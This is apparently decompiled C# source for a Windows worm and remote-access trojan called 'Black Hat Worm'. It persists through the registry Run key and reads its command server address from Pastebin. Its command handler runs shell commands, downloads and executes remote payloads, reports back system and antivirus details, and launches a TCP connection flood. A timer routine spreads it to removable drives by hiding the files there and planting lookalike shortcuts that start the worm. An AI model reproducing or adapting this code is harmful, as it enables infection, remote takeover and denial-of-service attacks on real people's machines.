using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Client.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Client;

[StandardModule]
internal sealed class BH
{
	public class SocketClient
	{
		public delegate void ConnectedEventHandler();

		public delegate void DisconnectedEventHandler();

		public delegate void DataEventHandler(byte[] b);

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private TcpClient C;

		private ConnectedEventHandler ConnectedEvent;

		private DisconnectedEventHandler DisconnectedEvent;

		private DataEventHandler DataEvent;

		private bool IsBuzy;

		private string SPL;

		public event ConnectedEventHandler Connected
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				ConnectedEvent = (ConnectedEventHandler)Delegate.Combine(ConnectedEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				ConnectedEvent = (ConnectedEventHandler)Delegate.Remove(ConnectedEvent, value);
			}
		}

		public event DisconnectedEventHandler Disconnected
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				DisconnectedEvent = (DisconnectedEventHandler)Delegate.Combine(DisconnectedEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				DisconnectedEvent = (DisconnectedEventHandler)Delegate.Remove(DisconnectedEvent, value);
			}
		}

		public event DataEventHandler Data
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				DataEvent = (DataEventHandler)Delegate.Combine(DataEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				DataEvent = (DataEventHandler)Delegate.Remove(DataEvent, value);
			}
		}

		public SocketClient()
		{
			__ENCAddToList(this);
			IsBuzy = false;
			SPL = "black hat";
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			checked
			{
				lock (__ENCList)
				{
					if (__ENCList.Count == __ENCList.Capacity)
					{
						int num = 0;
						int num2 = __ENCList.Count - 1;
						int num3 = 0;
						while (true)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							WeakReference weakReference = __ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									__ENCList[num] = __ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						__ENCList.RemoveRange(num, __ENCList.Count - num);
						__ENCList.Capacity = __ENCList.Count;
					}
					__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public void Connect(string h, int p)
		{
			try
			{
				try
				{
					if (C != null)
					{
						C.Close();
						C = null;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				while (IsBuzy)
				{
					Thread.Sleep(1);
				}
				try
				{
					C = new TcpClient();
					C.Connect(h, p);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				Thread thread = new Thread(RC, 10);
				thread.Start();
				ConnectedEvent?.Invoke();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				DisconnectedEvent?.Invoke();
				ProjectData.ClearProjectError();
			}
		}

		public void DisConnect()
		{
			try
			{
				C.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			C = null;
			DisconnectedEvent?.Invoke();
		}

		public void Send(string s)
		{
			Send(SB(s));
		}

		public void Send(byte[] b)
		{
			try
			{
				MemoryStream memoryStream = new MemoryStream();
				memoryStream.Write(b, 0, b.Length);
				memoryStream.Write(SB(SPL), 0, SPL.Length);
				C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				DisConnect();
				ProjectData.ClearProjectError();
			}
		}

		private void RC()
		{
			IsBuzy = true;
			MemoryStream memoryStream = new MemoryStream();
			int num = 0;
			checked
			{
				while (true)
				{
					Thread.Sleep(1);
					try
					{
						if (C == null || !C.Client.Connected)
						{
							break;
						}
						num++;
						if (num > 100)
						{
							num = 0;
							try
							{
								if (C.Client.Poll(-1, SelectMode.SelectRead) & (C.Client.Available <= 0))
								{
									break;
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								goto end_IL_0014;
							}
						}
						if (C.Available <= 0)
						{
							continue;
						}
						byte[] array = new byte[C.Available - 1 + 1];
						C.Client.Receive(array, 0, array.Length, SocketFlags.None);
						memoryStream.Write(array, 0, array.Length);
						while (BS(memoryStream.ToArray()).Contains(SPL))
						{
							Array array2 = fx(memoryStream.ToArray(), SPL);
							DataEvent?.Invoke((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null));
							memoryStream.Dispose();
							memoryStream = new MemoryStream();
							if (array2.Length == 2)
							{
								memoryStream.Write((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null)));
								Thread.Sleep(1);
								continue;
							}
							break;
						}
						continue;
						end_IL_0014:;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				}
				IsBuzy = false;
				DisConnect();
			}
		}
	}

	[AccessedThroughProperty("C")]
	private static SocketClient _C;

	public static string Yy = "\\worms\\.";

	public static string HOST = "[HH]";

	public static string port = "[PP]";

	public static string namee = "Black Hat Worm";

	public static string Mutexx = "OyijKSl7yqGBErNd";

	public static string nameee = "[SPNM]";

	public static string regg = "[NOREG]";

	public static string spreadss = "[NOSP]";

	public static string pastebin = "yes";

	public static string urlll = "https://pastebin.com/raw/IP:PORT";

	private static System.Timers.Timer dTimer = new System.Timers.Timer();

	private const int SETDESKWALLPAPER = 20;

	private const int UPDATEINIFILE = 1;

	private static string dosss;

	private static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string path2 = Application.get_ExecutablePath();

	private static string regs = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	private static string validchars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

	private static System.Timers.Timer aTimer = new System.Timers.Timer();

	private static Mutex mtx;

	private static string ruta;

	public static SocketClient C
	{
		[DebuggerNonUserCode]
		get
		{
			return _C;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			SocketClient.DisconnectedEventHandler value2 = Disconnected;
			SocketClient.ConnectedEventHandler value3 = Connected;
			SocketClient.DataEventHandler value4 = Data;
			if (_C != null)
			{
				_C.Disconnected -= value2;
				_C.Connected -= value3;
				_C.Data -= value4;
			}
			_C = value;
			if (_C != null)
			{
				_C.Disconnected += value2;
				_C.Connected += value3;
				_C.Data += value4;
			}
		}
	} = new SocketClient();


	[DllImport("winmm.dll")]
	private static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void main()
	{
		try
		{
			string text = Interaction.Command();
			text = text.Trim();
			Process.Start(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		bool createdNew = false;
		mtx = new Mutex(initiallyOwned: true, Mutexx, out createdNew);
		if (!createdNew)
		{
			ProjectData.EndApp();
		}
		try
		{
			if (Operators.CompareString(regg, "yes", false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(regs, writable: true)!.SetValue(Path.GetFileNameWithoutExtension(path2), appdata + "\\" + Path.GetFileName(path2));
				File.Copy(path2, appdata + "\\" + Path.GetFileName(path2));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(spreadss, "yes", false) == 0)
		{
			dTimer.Elapsed += tickee;
			dTimer.Interval = Conversions.ToDouble("2000");
			dTimer.Start();
		}
		int try0119_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0119_dispatch)
				{
				default:
					if (Operators.CompareString(pastebin, "yes", false) == 0)
					{
						WebClient webClient = new WebClient();
						string text2 = webClient.DownloadString(urlll);
						HOST = text2.Split(new char[1] { ':' })[0];
						port = text2.Split(new char[1] { ':' })[1];
						webClient.Dispose();
						C.Connect(HOST, Conversions.ToInteger(port));
					}
					else
					{
						C.Connect(HOST, Conversions.ToInteger(port));
					}
					break;
				}
				break;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				Thread.Sleep(4000);
				ProjectData.ClearProjectError();
				try0119_dispatch = 282;
			}
		}
	}

	private static void Connected()
	{
	}

	private static void Disconnected()
	{
		try
		{
			C.Connect(HOST, Conversions.ToInteger(port));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void Data(byte[] b)
	{
		string text = BS(b);
		string[] array = Strings.Split(text, Yy, -1, (CompareMethod)0);
		checked
		{
			try
			{
				switch (array[0])
				{
				case "~":
				{
					string antivirus = GetAntivirus();
					string text4 = ((Operators.CompareString(Path.GetFileName(path2), nameee, false) != 0) ? "NO" : "YES");
					string text5 = text5 + " SP";
					try
					{
						string[] array7 = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
						if (array7.Length == 1)
						{
							text5 += "0";
						}
						text5 += array7[array7.Length - 1];
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						text5 += "0";
						ProjectData.ClearProjectError();
					}
					text5 = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text5 + " x86") : (text5 + " x64"));
					WindowsIdentity current = WindowsIdentity.GetCurrent();
					WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
					string text6 = ((!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator)) ? "NO" : "YES");
					string text7 = namee.Replace("#", "") + "#" + Environment.UserName.Replace("#", "") + "#" + Environment.MachineName.Replace("#", "") + "#" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Replace("#", "") + text5 + "#v" + ((ServerComputer)MyProject.Computer).get_Info().get_OSVersion().Replace("#", "") + "#" + text4 + "#" + text6 + "#" + antivirus.Replace("#", "");
					C.Send("~" + Yy + text7);
					break;
				}
				case "close":
					ProjectData.EndApp();
					break;
				case "rec":
					Application.Restart();
					ProjectData.EndApp();
					break;
				case "shut":
					Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
					array[1] = null;
					break;
				case "logof":
					Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
					array[1] = null;
					break;
				case "rebot":
					Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
					array[1] = null;
					break;
				case "opencd":
					mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
					break;
				case "closecd":
					mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);
					break;
				case "changeWL":
					try
					{
						string lpvParam = Path.GetTempPath() + "img.Bmp";
						byte[] bytes2 = Convert.FromBase64String(array[1]);
						File.WriteAllBytes(lpvParam, bytes2);
						SystemParametersInfoA(20, 0, ref lpvParam, 1);
						array[1] = null;
						break;
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
						break;
					}
				case "runexe":
					try
					{
						StringBuilder stringBuilder2 = new StringBuilder();
						Random random2 = new Random();
						int num3 = 1;
						do
						{
							int index2 = random2.Next(0, validchars.Length);
							char value2 = validchars[index2];
							stringBuilder2.Append(value2);
							num3++;
						}
						while (num3 <= 8);
						string text9 = stringBuilder2.ToString();
						string text10 = Path.GetTempPath() + text9 + "-tmp" + array[1].Split(new char[1] { ':' })[1];
						byte[] bytes = Convert.FromBase64String(array[1].Split(new char[1] { ':' })[0]);
						File.WriteAllBytes(text10, bytes);
						Process.Start(text10);
						array[1] = null;
						break;
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
						break;
					}
				case "fromurl":
					try
					{
						StringBuilder stringBuilder = new StringBuilder();
						Random random = new Random();
						int num2 = 1;
						do
						{
							int index = random.Next(0, validchars.Length);
							char value = validchars[index];
							stringBuilder.Append(value);
							num2++;
						}
						while (num2 <= 8);
						string text8 = stringBuilder.ToString();
						string fileName = Path.GetTempPath() + text8 + "-" + array[1].Split(new char[1] { '~' })[1];
						WebClient webClient = new WebClient();
						webClient.DownloadFile(array[1].Split(new char[1] { '~' })[0], fileName);
						Process.Start(fileName);
						array[1] = null;
						break;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
						break;
					}
				case "openurl":
					Process.Start(array[1]);
					array[1] = null;
					break;
				case "unstall":
				{
					string newValue = path2;
					string text2 = array[1];
					if (Operators.CompareString(regg, "yes", false) == 0)
					{
						RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(regs, writable: true);
						registryKey.DeleteValue(Path.GetFileNameWithoutExtension(path2), throwOnMissingValue: false);
						File.Delete(appdata + "\\" + Path.GetFileName(path2));
					}
					string text3 = Path.GetTempPath() + "del.vbs";
					text2 = text2.Replace("%path%", newValue);
					text2 = text2.Replace("%usb%", nameee);
					StreamWriter streamWriter = new StreamWriter(text3, append: false);
					streamWriter.WriteLine(text2);
					streamWriter.Close();
					array[1] = null;
					Process.Start(text3);
					ProjectData.EndApp();
					break;
				}
				case "BSOD":
					Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
					array[1] = null;
					break;
				case "textsp":
					try
					{
						object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.SpVoice", ""));
						object[] array2 = new object[1];
						string[] array3 = array;
						string[] array4 = array3;
						int num = 1;
						array2[0] = array4[1];
						object[] array5 = array2;
						bool[] array6 = new bool[1] { true };
						NewLateBinding.LateCall(objectValue, (Type)null, "speak", array5, (string[])null, (Type[])null, array6, true);
						if (array6[0])
						{
							array3[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
						}
						array[1] = null;
						break;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						break;
					}
				case "ddos":
					dosss = array[1];
					aTimer.Elapsed += tick;
					aTimer.Interval = 1.0;
					aTimer.Start();
					array[1] = null;
					break;
				case "ddosstop":
					aTimer.Stop();
					array[1] = null;
					break;
				case "admin":
					try
					{
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						new Process();
						ProcessStartInfo processStartInfo2 = processStartInfo;
						processStartInfo2.UseShellExecute = true;
						processStartInfo2.FileName = Application.get_ExecutablePath();
						processStartInfo2.WindowStyle = ProcessWindowStyle.Normal;
						processStartInfo2.Verb = "runas";
						processStartInfo2 = null;
						Process.Start(processStartInfo);
						ProjectData.EndApp();
						break;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						break;
					}
				}
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string GetAntivirus()
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = new ManagementObjectSearcher("root\\SecurityCenter" + Interaction.IIf(((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Contains("XP"), (object)"", (object)"2").ToString(), "SELECT * FROM AntiVirusProduct").Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					text = text + " " + ((ManagementBaseObject)val).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (Operators.CompareString(text, string.Empty, false) != 0)
			{
				return text;
			}
			return "No Antivirus";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "No Antivirus";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static void tick(object sender, ElapsedEventArgs e)
	{
		int try0001_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
				{
					IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(dosss.Split(new char[1] { ':' })[0]), Convert.ToInt32(dosss.Split(new char[1] { ':' })[1]));
					Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					socket.Connect(remoteEP);
					socket.Close();
					break;
				}
				}
				break;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				try0001_dispatch = 2;
			}
		}
	}

	public static byte[] SB(string s)
	{
		return Encoding.Default.GetBytes(s);
	}

	public static string BS(byte[] b)
	{
		return Encoding.Default.GetString(b);
	}

	public static Array fx(byte[] b, string WRD)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(BS(b), WRD, -1, (CompareMethod)0);
		memoryStream.Write(b, 0, array[0].Length);
		checked
		{
			memoryStream2.Write(b, array[0].Length + WRD.Length, b.Length - (array[0].Length + WRD.Length));
			list.Add(memoryStream.ToArray());
			list.Add(memoryStream2.ToArray());
			memoryStream.Dispose();
			memoryStream2.Dispose();
			return list.ToArray();
		}
	}

	private static void tickee(object sender, ElapsedEventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		string current = default(string);
		List<string> list = default(List<string>);
		List<string> list2 = default(List<string>);
		object obj2 = default(object);
		IEnumerator enumerator = default(IEnumerator);
		object objectValue = default(object);
		string[] files = default(string[]);
		int num5 = default(int);
		string text = default(string);
		string[] directories = default(string[]);
		int num6 = default(int);
		string item = default(string);
		List<string>.Enumerator enumerator2 = default(List<string>.Enumerator);
		string current2 = default(string);
		object obj3 = default(object);
		object objectValue2 = default(object);
		object objectValue3 = default(object);
		List<string>.Enumerator enumerator3 = default(List<string>.Enumerator);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 1773:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_001c;
						case 5:
							goto IL_0030;
						case 6:
							goto IL_006b;
						case 7:
							goto IL_0091;
						case 8:
						case 9:
							goto IL_00bd;
						case 10:
							goto IL_00de;
						case 11:
							goto IL_00e1;
						case 12:
							goto IL_010d;
						case 13:
							goto IL_0135;
						case 15:
							goto IL_014f;
						case 16:
							goto IL_0153;
						case 18:
							goto IL_0160;
						case 14:
						case 17:
							goto IL_0166;
						case 19:
							goto IL_016e;
						case 20:
							goto IL_018a;
						case 21:
							goto IL_019c;
						case 22:
							goto IL_01aa;
						case 23:
							goto IL_01cb;
						case 24:
							goto IL_01db;
						case 26:
							goto IL_020e;
						case 27:
							goto IL_0212;
						case 28:
							goto IL_025e;
						case 29:
							goto IL_0295;
						case 30:
							goto IL_02c9;
						case 31:
							goto IL_02e3;
						case 32:
							goto IL_037a;
						case 33:
							goto IL_0395;
						case 35:
							goto IL_03bc;
						case 36:
							goto IL_03c0;
						case 40:
							goto IL_03ec;
						case 41:
							goto IL_03f0;
						case 39:
						case 42:
						case 43:
							goto IL_040c;
						case 25:
						case 44:
						case 45:
							goto IL_040f;
						case 46:
						case 47:
							goto IL_041b;
						case 34:
						case 37:
						case 38:
							goto IL_0424;
						case 48:
							goto IL_044e;
						case 49:
							goto IL_046f;
						case 50:
							goto IL_047f;
						case 52:
							goto IL_04b2;
						case 53:
							goto IL_04b6;
						case 54:
							goto IL_0502;
						case 55:
							goto IL_0539;
						case 56:
							goto IL_056d;
						case 57:
							goto IL_0595;
						case 58:
							goto IL_05b1;
						case 61:
						case 62:
							goto IL_05b6;
						case 51:
						case 59:
						case 60:
							goto IL_05bf;
						default:
							goto end_IL_0001;
						case 63:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_0539:
					num = 55;
					NewLateBinding.LateSetComplex(obj, (Type)null, "Arguments", new object[1] { " " + Path.GetFileName(current) }, (string[])null, (Type[])null, false, true);
					goto IL_056d;
					IL_0502:
					num = 54;
					NewLateBinding.LateSetComplex(obj, (Type)null, "TargetPath", new object[1] { ruta + "\\" + nameee }, (string[])null, (Type[])null, false, true);
					goto IL_0539;
					IL_000a:
					num = 2;
					list = new List<string>();
					goto IL_0013;
					IL_0013:
					num = 3;
					list2 = new List<string>();
					goto IL_001c;
					IL_001c:
					num = 4;
					obj2 = Interaction.CreateObject("Scripting.FileSystemObject", "");
					goto IL_0030;
					IL_0030:
					num = 5;
					enumerator = ((IEnumerable)NewLateBinding.LateGet(obj2, (Type)null, "Drives", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
					goto IL_0055;
					IL_0055:
					if (enumerator.MoveNext())
					{
						objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						goto IL_006b;
					}
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto IL_00de;
					IL_056d:
					num = 56;
					NewLateBinding.LateSetComplex(obj, (Type)null, "IconLocation", new object[1] { "C:\\windows\\system32\\shell32.dll,3" }, (string[])null, (Type[])null, false, true);
					goto IL_0595;
					IL_006b:
					num = 6;
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type)null, "DriveType", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1, false))
					{
						goto IL_0091;
					}
					goto IL_00bd;
					IL_0091:
					num = 7;
					ruta = Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(objectValue, (Type)null, "DriveLetter", new object[0], (string[])null, (Type[])null, (bool[])null), (object)":\\"));
					goto IL_00bd;
					IL_00bd:
					num = 9;
					goto IL_0055;
					IL_0595:
					num = 57;
					NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_05b1;
					IL_05b1:
					obj = null;
					goto IL_05bf;
					IL_00de:
					obj2 = null;
					goto IL_00e1;
					IL_00e1:
					num = 11;
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(path2, ruta + "\\" + nameee);
					goto IL_010d;
					IL_010d:
					num = 12;
					files = Directory.GetFiles(ruta, "*.*");
					num5 = 0;
					goto IL_0125;
					IL_0125:
					if (num5 < files.Length)
					{
						text = files[num5];
						goto IL_0135;
					}
					goto IL_016e;
					IL_05bf:
					num = 60;
					File.SetAttributes(current, FileAttributes.Hidden | FileAttributes.System);
					goto IL_05b6;
					IL_0135:
					num = 13;
					if (Operators.CompareString(Path.GetExtension(text), ".lnk", false) != 0)
					{
						goto IL_014f;
					}
					goto IL_0166;
					IL_014f:
					num = 15;
					goto IL_0153;
					IL_0153:
					num = 16;
					list.Add(text);
					goto IL_0166;
					IL_0166:
					num5 = checked(num5 + 1);
					goto IL_0160;
					IL_0160:
					num = 18;
					goto IL_0125;
					IL_016e:
					num = 19;
					directories = Directory.GetDirectories(ruta);
					num6 = 0;
					goto IL_01a0;
					IL_01a0:
					if (num6 < directories.Length)
					{
						item = directories[num6];
						goto IL_018a;
					}
					goto IL_01aa;
					IL_01aa:
					num = 22;
					enumerator2 = list.GetEnumerator();
					goto IL_01b6;
					IL_01b6:
					if (enumerator2.MoveNext())
					{
						current2 = enumerator2.Current;
						goto IL_01cb;
					}
					((IDisposable)enumerator2).Dispose();
					goto IL_044e;
					IL_019c:
					num = 21;
					goto IL_01a0;
					IL_01cb:
					num = 23;
					if (File.Exists(current2))
					{
						goto IL_01db;
					}
					goto IL_041b;
					IL_01db:
					num = 24;
					if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(ruta + "\\" + Path.GetFileName(current2) + ".lnk"))
					{
						goto IL_020e;
					}
					goto IL_040f;
					IL_020e:
					num = 26;
					goto IL_0212;
					IL_0212:
					num = 27;
					obj3 = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), (Type)null, "CreateShortcut", new object[1] { ruta + "\\" + Path.GetFileName(current2) + ".lnk" }, (string[])null, (Type[])null, (bool[])null);
					goto IL_025e;
					IL_025e:
					num = 28;
					NewLateBinding.LateSetComplex(obj3, (Type)null, "TargetPath", new object[1] { ruta + "\\" + nameee }, (string[])null, (Type[])null, false, true);
					goto IL_0295;
					IL_0295:
					num = 29;
					NewLateBinding.LateSetComplex(obj3, (Type)null, "Arguments", new object[1] { " " + Path.GetFileName(current2) }, (string[])null, (Type[])null, false, true);
					goto IL_02c9;
					IL_02c9:
					num = 30;
					objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("wscript.shell", ""));
					goto IL_02e3;
					IL_02e3:
					num = 31;
					objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "regread", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject((object)"HKEY_LOCAL_MACHINE\\software\\classes\\", NewLateBinding.LateGet(objectValue2, (Type)null, "regread", new object[1] { "HKEY_LOCAL_MACHINE\\software\\classes\\." + Strings.Split(Path.GetFileName(current2), ".", -1, (CompareMethod)0)[Information.UBound((Array)Strings.Split(Path.GetFileName(current2), ".", -1, (CompareMethod)0), 1)] + "\\" }, (string[])null, (Type[])null, (bool[])null)), (object)"\\defaulticon\\") }, (string[])null, (Type[])null, (bool[])null));
					goto IL_037a;
					IL_037a:
					num = 32;
					if (Strings.InStr(Conversions.ToString(objectValue3), ",", (CompareMethod)0) == 0)
					{
						goto IL_0395;
					}
					goto IL_03bc;
					IL_0395:
					num = 33;
					NewLateBinding.LateSetComplex(obj3, (Type)null, "iconlocation", new object[1] { current2 }, (string[])null, (Type[])null, false, true);
					goto IL_0424;
					IL_03bc:
					num = 35;
					goto IL_03c0;
					IL_03c0:
					num = 36;
					NewLateBinding.LateSetComplex(obj3, (Type)null, "iconlocation", new object[1] { RuntimeHelpers.GetObjectValue(objectValue3) }, (string[])null, (Type[])null, false, true);
					goto IL_0424;
					IL_0424:
					num = 38;
					if (Operators.CompareString(Path.GetFileName(current2), nameee, false) != 0)
					{
						goto IL_03ec;
					}
					goto IL_040c;
					IL_03ec:
					num = 40;
					goto IL_03f0;
					IL_03f0:
					num = 41;
					NewLateBinding.LateCall(obj3, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_040c;
					IL_040c:
					obj3 = null;
					goto IL_040f;
					IL_040f:
					num = 45;
					File.SetAttributes(current2, FileAttributes.Hidden | FileAttributes.System);
					goto IL_041b;
					IL_041b:
					num = 47;
					goto IL_01b6;
					IL_05b6:
					num = 62;
					goto IL_045a;
					IL_044e:
					num = 48;
					enumerator3 = list2.GetEnumerator();
					goto IL_045a;
					IL_045a:
					if (enumerator3.MoveNext())
					{
						current = enumerator3.Current;
						goto IL_046f;
					}
					((IDisposable)enumerator3).Dispose();
					goto end_IL_0001_2;
					IL_018a:
					num = 20;
					list2.Add(item);
					num6 = checked(num6 + 1);
					goto IL_019c;
					IL_046f:
					num = 49;
					if (Directory.Exists(current))
					{
						goto IL_047f;
					}
					goto IL_05b6;
					IL_047f:
					num = 50;
					if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(ruta + "\\" + Path.GetFileName(current) + "\u200c.lnk"))
					{
						goto IL_04b2;
					}
					goto IL_05bf;
					IL_04b2:
					num = 52;
					goto IL_04b6;
					IL_04b6:
					num = 53;
					obj = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), (Type)null, "CreateShortcut", new object[1] { ruta + "\\" + Path.GetFileName(current) + "\u200c.lnk" }, (string[])null, (Type[])null, (bool[])null);
					goto IL_0502;
					end_IL_0001:
					break;
				}
			}
			catch (object obj4) when (obj4 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj4);
				try0001_dispatch = 1773;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
